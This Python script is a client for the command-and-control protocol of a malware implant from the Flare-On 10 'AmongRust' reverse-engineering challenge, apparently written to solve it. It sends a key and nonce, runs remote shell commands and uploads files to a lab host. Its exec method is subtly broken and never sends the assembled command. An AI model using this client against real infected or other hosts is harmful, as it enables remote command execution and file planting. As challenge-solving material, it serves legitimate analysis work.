# Flare-On 10, Challenge 8, AmongRust
#
# C2 protocol, tcp port 8345
# the infected host acts as the server
# session is unauthenticated, but infected hosts expects
# - 32 bytes as a crypto key value, no terminator
# - 32 bytes as a crypto nonce value, no terminator
# before commands can be issued
#
# command strings have to be suffixed with 0x0d 0x0a:
# - exit
# - exec cli-command
#   - answer has EOT char 0x0d
# - upload path size
#   - upload command is ACK'd with string ACK_UPLOAD, terminator 0x0d
#     - which means implant is ready to receive payload bytes of given size
#   - upon receiving the size amount of bytes, implant replies with ACK_UPLOAD_FIN and 0x0d terminator
#
# TODO:
# - REPL c2 shell
#

import socket
from binascii import unhexlify


class FlareOn10Challenge8C2:
    def __init__(
        self,
        c2_host: str,
        c2_port: int,
        key: bytes,
        nonce: bytes,
        chunk_size: int = 512,
        debug_level: int = 0,
    ):
        # debug_level 0 = silence, 1 = high level, 2 = gimme all
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.chunk_size = chunk_size
        self.debug_level = debug_level
        if self.debug_level > 0:
            print(f"[*] Connecting to {self.c2_host}:{self.c2_port}")
        self.connect(self.c2_host, self.c2_port)
        if self.debug_level > 0:
            print("[*] Sending crypto parameters")
        self.crypto_setup(key, nonce)

    def connect(self, host: str, port: int):
        self.sock.connect((host, port))

    def recv_str(self):
        # EOT char = 0x0d
        self.result = ""
        cur_byte = self.recv_n(1)
        while cur_byte != b"\x0d":
            self.result += cur_byte.decode("UTF-8")
            cur_byte = self.recv_n(1)
        if self.debug_level > 1:
            print(f"[IN str, len={len(self.result)}] {self.result}")
        return self.result

    def send(self, data: bytes) -> int:
        self.numBytesSent = 0
        self.numBytesRemaining = len(data)
        while self.numBytesRemaining > 0:
            if self.numBytesRemaining > self.chunk_size:
                self.sent = self.sock.send(
                    data[self.numBytesSent : self.numBytesSent + self.chunk_size]
                )
            else:
                self.sent = self.sock.send(
                    data[self.numBytesSent : self.numBytesSent + self.numBytesRemaining]
                )
            if self.debug_level > 1:
                print(
                    f"[OUT, len={self.sent}] {data[self.numBytesSent: self.numBytesSent + self.sent]}"
                )
            self.numBytesSent += self.sent
            self.numBytesRemaining -= self.sent
        assert len(data) == self.numBytesSent
        return self.numBytesSent

    def recv_n(self, numBytesToRead) -> bytes:
        self.numBytesRead = 0
        self.numBytesRemaining = numBytesToRead
        self.c2_msg = bytearray()
        while self.numBytesRemaining > 0:
            if self.numBytesRemaining > self.chunk_size:
                self.cur_chunk = self.sock.recv(self.chunk_size)
            else:
                self.cur_chunk = self.sock.recv(self.numBytesRemaining)
            self.len_cur_chunk = len(self.cur_chunk)
            if self.len_cur_chunk == 0:
                raise RuntimeError("socket connection error while recv'ing")
            self.c2_msg.extend(self.cur_chunk)
            self.numBytesRead += self.len_cur_chunk
            self.numBytesRemaining -= self.len_cur_chunk
        assert len(self.c2_msg) == numBytesToRead
        if self.debug_level > 1 and numBytesToRead > 1:
            print(f"[IN bytes, len={len(self.c2_msg)}] {self.c2_msg}")
        return bytes(self.c2_msg)

    def crypto_setup(self, key: bytes, nonce: bytes):
        if self.debug_level > 0:
            print(f"[*] Sending key {key}")
        self.send(key)
        self.ack_k = self.recv_str()
        assert self.ack_k == "ACK_K"
        if self.debug_level > 0:
            print(f"[*] Sending nonce {nonce}")
        self.send(nonce)
        self.ack_n = self.recv_str()
        assert self.ack_n == "ACK_N"

    def exec(self, cmd: str):
        if self.debug_level > 0:
            print(f"[*] Sending shell command: {cmd}")
        # terminator 0x0d 0x0a and convert to bytes
        self.cmd = "exec " + cmd + "\x0d\x0a"
        self.cmd_bytes = cmd.encode("UTF-8")
        # send command bytes
        self.send(self.cmd_bytes)
        # read response
        self.resp = self.recv_str()

    def upload(self, local_filename: str, remote_path: str):
        if self.debug_level > 0:
            print(
                f"[*] Uploading local file {local_filename} to remote path {remote_path}"
            )
        with open(local_filename, "rb") as f:
            self.file_content = f.read()
        f.close()
        print("WTF {self.file_content[:16]}")
        self.file_size = len(self.file_content)
        # terminator 0x0d 0x0a and convert to bytes
        self.cmd = "upload " + remote_path + " " + str(self.file_size) + "\x0d\x0a"
        self.cmd_bytes = self.cmd.encode("UTF-8")
        # send upload command bytes
        self.send(self.cmd_bytes)
        # recv str ACK_UPLOAD
        self.resp = self.recv_str()
        assert self.resp == "ACK_UPLOAD"
        # send binary file contents
        self.send(self.file_content)
        # recv str ACK_UPLOAD_FIN
        self.resp = self.recv_str()
        assert self.resp == "ACK_UPLOAD_FIN"
        if self.debug_level > 0:
            print("[*] Upload acknowledged by server")


# Main ###
if __name__ == "__main__":
    key = unhexlify("6574212c9b4d9334d893bec2477cb86a70983b3c33952d68a8cc5c0226070abf")
    nonce = unhexlify(
        "0e02f4a9a8b5beeaba8348d6d2f87c606849df9a5eef49a65c98cf07d4c238a6"
    )
    c2_host = "192.168.58.140"
    c2_port = 8345
    c2 = FlareOn10Challenge8C2(c2_host, c2_port, key, nonce, debug_level=2)
    # c2.exec("whoami")
    # c2.exec("echo 'hello, world'")
    c2.upload("./wallpaper_crypted.ps1", "C:\\Users\\public\\wallpaper.ps1")
    c2.upload("./wallpaper_crypted.PNG", "C:\\Users\\public\\wallpaper.PNG")
